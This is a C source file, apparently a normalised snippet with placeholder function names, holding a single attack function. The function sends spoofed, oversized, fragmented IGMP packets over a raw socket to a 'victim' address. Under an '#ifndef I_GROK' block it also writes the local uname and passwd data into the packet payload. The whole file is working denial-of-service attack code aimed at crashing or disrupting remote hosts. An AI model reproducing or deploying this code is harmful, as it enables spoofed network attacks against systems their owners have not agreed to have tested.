#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct utsname {int dummy; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; } ;
struct passwd {int dummy; } ;
struct iphdr {int version; int ihl; int ttl; unsigned long saddr; void* frag_off; void* check; int /*<<< orphan*/  daddr; void* id; int /*<<< orphan*/  protocol; void* tot_len; } ;
struct igmphdr {void* csum; scalar_t__ group; scalar_t__ type; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_IGMP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int IP_MF ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 scalar_t__ FUNC0 (int,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (unsigned char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 void* FUNC5 (int) ; 
 void* FUNC6 (unsigned short*,int) ; 
 int /*<<< orphan*/  FUNC7 (struct passwd*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int FUNC9 () ; 
 int FUNC10 (int,unsigned char*,int,int /*<<< orphan*/ ,struct sockaddr_in*,int) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (struct utsname*) ; 
 int /*<<< orphan*/  FUNC13 (int) ; 

int FUNC14(struct sockaddr_in *victim, unsigned long spoof)
{
        int BIGIGMP = 1500;
        unsigned char *pkt;
        struct iphdr *ip;
        struct igmphdr *igmp;
        struct utsname *un;
        struct passwd *p;

        int i, s;
        int id = (FUNC9() % 40000) + 500;

        pkt = (unsigned char *)FUNC0(1, BIGIGMP);
        ip = (struct iphdr *)pkt;
        igmp = (struct igmphdr *)(pkt + sizeof(struct iphdr));

        ip->version = 4;
        ip->ihl = (sizeof *ip) / 4;
        ip->ttl = 255;
        ip->tot_len = FUNC5(BIGIGMP);
        ip->protocol = IPPROTO_IGMP;
        ip->id = FUNC5(id);
        ip->frag_off = FUNC5(IP_MF);
        ip->saddr = spoof;
        ip->daddr = victim->sin_addr.s_addr;
        ip->check = FUNC6((unsigned short *)ip, sizeof(struct iphdr));

        igmp->type = 0;
        igmp->group = 0;
        igmp->csum = FUNC6((unsigned short *)igmp, sizeof(struct igmphdr));

        for(i = sizeof(struct iphdr) + sizeof(struct igmphdr) + 1;
            i < BIGIGMP; i++)
                pkt[i] = FUNC9() % 255;
#ifndef I_GROK
        un = (struct utsname *)(pkt + sizeof(struct iphdr) +
              sizeof(struct igmphdr) + 40);
        FUNC12(un);
        p = (struct passwd *)((void *)un + sizeof(struct utsname) + 10);
        FUNC7(p, FUNC3(FUNC4()), sizeof(struct passwd));
#endif
        if((s = FUNC11(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                FUNC8("error: socket()");
                return 1;
        }

        if(FUNC10(s, pkt, BIGIGMP, 0, victim,
           sizeof(struct sockaddr_in)) == -1) { 
                FUNC8("error: sendto()");
                return 1;
        }
        FUNC13(1000000);

        for(i = 1; i < 5; i++) {
                if(i > 3)
                        ip->frag_off = FUNC5(((BIGIGMP-20) * i) >> 3);
                else
                        ip->frag_off = FUNC5(((BIGIGMP-20) * i) >> 3 | IP_MF);
                FUNC10(s, pkt, BIGIGMP, 0, victim, sizeof(struct sockaddr_in));
                FUNC13(2000000);
        }

        FUNC2(pkt);
        FUNC1(s);
        return 0;
}